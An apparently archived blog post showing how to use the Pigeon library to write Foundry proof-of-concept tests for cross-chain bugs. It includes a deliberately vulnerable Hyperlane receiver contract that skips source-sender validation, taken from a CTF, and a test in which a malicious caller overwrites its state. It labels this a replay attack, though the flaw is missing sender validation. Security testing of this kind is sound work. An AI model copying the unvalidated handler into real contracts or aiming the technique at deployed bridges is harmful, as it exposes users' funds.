# 🕊️ Pigeon — Protection for Cross-Chain Applications

- **Source URL:** https://www.sujithsomraaj.xyz/blog/cross-chain-poc-pigeon
- **Fetched:** 2026-11-16
- **Channel:** @defendor_eng
- **Telegram message:** https://t.me/defendor_eng/963 (id 963)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Cross-chain communication has become crucial to blockchain development, enabling interoperability and unlocking new decentralized applications (dApps) possibilities. However, due to the complexity of cross-chain interactions, security vulnerabilities and bugs can easily creep in. This blog post explores how the Pigeon library can efficiently help developers identify proof-of-concept (PoC) cross-chain bugs.

## Understanding Cross-Chain Vulnerabilities

Before diving into the Pigeon library, let's briefly discuss the vulnerabilities that can arise in cross-chain scenarios. Some common issues include:

1. **Replay Attacks:** Malicious actors can attempt to replay legitimate cross-chain messages, leading to unintended consequences or double-spending.
2. **Message Tampering:** Attackers may try to modify the contents of cross-chain messages, altering the dApp's intended behavior.
3. **Insufficient Validation:** Inadequate validation of incoming cross-chain messages can allow attackers to inject malicious data or exploit edge cases.
4. **Synchronization Issues:** Discrepancies in the timing or order of cross-chain messages can lead to inconsistencies and potential vulnerabilities.

These are just a few developers' challenges when building cross-chain applications. Identifying and mitigating such vulnerabilities is crucial to ensure the security and integrity of dApps.

## Introducing the Pigeon Library

The Pigeon library is an open-source testing toolkit designed specifically for cross-chain application development and testing. It provides a set of helper contracts and utilities that simulate cross-chain transactions and interactions, enabling developers and security researchers to test dApps in a forked mainnet environment.

With Pigeon, you can:

- Simulate cross-chain transactions as close to mainnet behavior as possible.
- Simulate the off-chain infrastructure of Arbitrary Message Bridges (AMBs) like LayerZero, Hyperlane, and Wormhole.

## By leveraging the Pigeon library, developers can proactively identify PoC cross-chain bugs before deploying their dApps to production.

Using Pigeon to PoC Cross-Chain Bugs Let's walk through an example of using Pigeon to PoC, a potential replay attack vulnerability in a cross-chain scenario.

#### Step 1: Set up the Testing Environment

First, ensure you have the Pigeon library installed in your Foundry project. You can install it using the following command:

```
forge install exp-table/pigeon
```
Don't forget to add the necessary remappings to your remappings.txt file.

#### Step 2: Create the Victim Contract

Secondly, let’s create a vulnerable contract to test our PoC. This contract validates if the `msg.sender` is Hyperlane Mailbox, but fails to check the source chain sender, allowing anyone to update `value`. This is the cross-chain problem of Paradigm CTF 2023, and I solved it in less than 15 minutes.

```
contract VulnerableContract {
    uint256 public value;
    IMailbox public constant mailbox = IMailbox(0x35231d4c2D8B8ADcB5617A638A0c4548684c7C70);
    /// @dev this contract is vulnerable here, it don't validate the sender
    function handle(uint32, bytes32, bytes calldata _message) external {
        require(msg.sender == address(mailbox));
        value = abi.decode(_message, (uint256));
    }
}
```
#### Step 3: Write the PoC Test

Create a new Solidity test file (e.g., `CrossChainBugPoc.t.sol`) and import the required dependencies:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "pigeon/hyperlane/HyperlaneHelper.sol";
```
Next, define the `CrossChainBugPoc` contract that inherits from the `Test` Contract:

```
contract CrossChainBugPoc is Test {
    HyperlaneHelper public hyperlaneHelper;
    VulnerableContract public vulnerableContract;
    address usualCaller = address(42);
    address maliciousCaller = address(420);
    uint256 public L1_FORK_ID;
    uint256 public L2_FORK_ID;
    uint32 constant L1_DOMAIN = 1;
    uint32 constant L2_DOMAIN = 137;
    address public constant L1_HLMailbox = 0x35231d4c2D8B8ADcB5617A638A0c4548684c7C70;
    address public constant L2_HLMailbox = 0x35231d4c2D8B8ADcB5617A638A0c4548684c7C70;
    function setUp() public {
        L2_FORK_ID = vm.createFork("https://polygon-rpc.com");
        vulnerableContract = new VulnerableContract();
        L1_FORK_ID = vm.createSelectFork("https://eth.llamarpc.com");
        hyperlaneHelper = new HyperlaneHelper();
    }
    // ... PoC test functions ...
}
```
In the `setUp` function, we create an instance of the `HyperlaneHelper` contract and deploy the `VulnerableContract` that we'll be testing.

#### Step 3: Simulate Cross-Chain Transactions

Now, let's write a test function to simulate a replay attack:

```
function testInvalidSenderAttack() public {
        // Record logs on the source chain
        vm.recordLogs();
        vm.prank(usualCaller);
        IMailbox(L1_HLMailbox).dispatch(
            L2_DOMAIN, bytes32(uint256(uint160(address(vulnerableContract)))), abi.encode(uint256(100_000_000))
        );
        // Simulate the first cross-chain message transfer
        hyperlaneHelper.help(L1_HLMailbox, L2_HLMailbox, L2_FORK_ID, vm.getRecordedLogs());
        // Check the state on the destination chain
        vm.selectFork(L2_FORK_ID);
        assertEq(VulnerableContract(vulnerableContract).value(), 100_000_000);
        vm.selectFork(L1_FORK_ID);
        // Now a hacker tries to set the value to zero again
        vm.recordLogs();
        vm.prank(maliciousCaller);
        IMailbox(L1_HLMailbox).dispatch(
            L2_DOMAIN, bytes32(uint256(uint160(address(vulnerableContract)))), abi.encode(uint256(0))
        );
        // Simulate the first cross-chain message transfer
        hyperlaneHelper.help(L1_HLMailbox, L2_HLMailbox, L2_FORK_ID, vm.getRecordedLogs());
        // Check the state on the destination chain
        vm.selectFork(L2_FORK_ID);
        assertEq(VulnerableContract(vulnerableContract).value(), 0);
    }
```
In this test function, we perform the following steps:

1. Record the logs on the source chain (L1) when the `sendCrossChainMessage` function is called on the `VulnerableContract`.
2. Simulate the first cross-chain message transfer using the `help` function from the `HyperlaneHelper` contract, passing the necessary parameters.
3. Check the state on the destination chain (L2) to ensure the message is processed correctly.
4. Simulate the attack by sending a message to the vulnerable contract by a malicious actor to rest the value
5. Check if the `value` variable was updated again, indicating a successful replay attack.

#### Step 5: Run the PoC Test

```
forge test --match-test testInvalidSenderAttack -vvvvv
```
If the test passes, it means the PoC successfully demonstrated the replay attack vulnerability in the `VulnerableContract`. The test output will show that the `value` variable was updated twice, indicating that anyone can update a state variable cross-chain due to a lack of validations.

Find the demo repository in [github.com](https://github.com/sujithsomraaj/pigeon-cross-chain-poc)

## Conclusion

By leveraging the Pigeon library, developers can effectively PoC cross-chain bugs and vulnerabilities in their dApps. The library provides a set of helper contracts and utilities that simulate cross-chain transactions and interactions, enabling thorough testing and validation.

The example above demonstrated how to use Pigeon to PoC, but a vulnerable contract lacks a cross-chain sender validation attack vulnerability. Pigeon also supports other commonly used message bridges and strives to support more down the road.
